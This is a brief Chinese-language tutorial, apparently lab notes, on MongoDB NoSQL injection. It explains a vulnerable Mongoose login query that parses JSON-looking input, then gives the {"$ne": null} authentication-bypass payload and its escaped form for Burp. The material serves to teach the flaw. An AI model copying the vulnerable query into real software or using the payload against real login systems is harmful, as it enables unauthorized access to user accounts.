## MongoDB NoSQL 注入

漏洞源代码

```js
const users = await User.find({
  email: email.startsWith("{") && email.endsWith("}") ? JSON.parse(email) : email,
  password: password.startsWith("{") && password.endsWith("}") ? JSON.parse(password) : password
});
```

**1. `User.find({...})`**

- 这是 **Mongoose (MongoDB ORM)** 的查询方法
- 它会在数据库的 `users` 集合里查找符合条件的文档
- 条件就是传进去的对象 `{ email: ..., password: ... }`

**2. `email.startsWith("{") && email.endsWith("}")`**

- 检查 **email 参数**是否是一个以 `{` 开头、以 `}` 结尾的字符串
- 例如：
  - `"test@example.com"` → `false`
  - `"{\"$ne\":null}"` → `true`

**3. 三元运算符 `? JSON.parse(email) : email`**

- 如果 `email` 是一个看起来像 **JSON 对象**的字符串，就执行 `JSON.parse(email)` → 得到一个 **JS 对象**
- 否则，就直接使用普通字符串

这样写的结果是

```js
User.find({
  email: { $ne: null },
  password: { $ne: null }
});
```

因为 MongoDB 的 `$ne`、`$regex` 等操作符会被解释为 **查询条件**，不是普通字符串

所以攻击者可以绕过认证逻辑：

- `email={"$ne":null}`, `password={"$ne":null}` → 匹配任意用户，直接登录成功

在 Burp 需要 `\` 转义

```
{
  "email": "{\"$ne\": null}",
  "password": "{\"$ne\": null}"
}
```

![](https://pic1.imgdb.cn/item/68a4e39758cb8da5c83a8d1a.png)
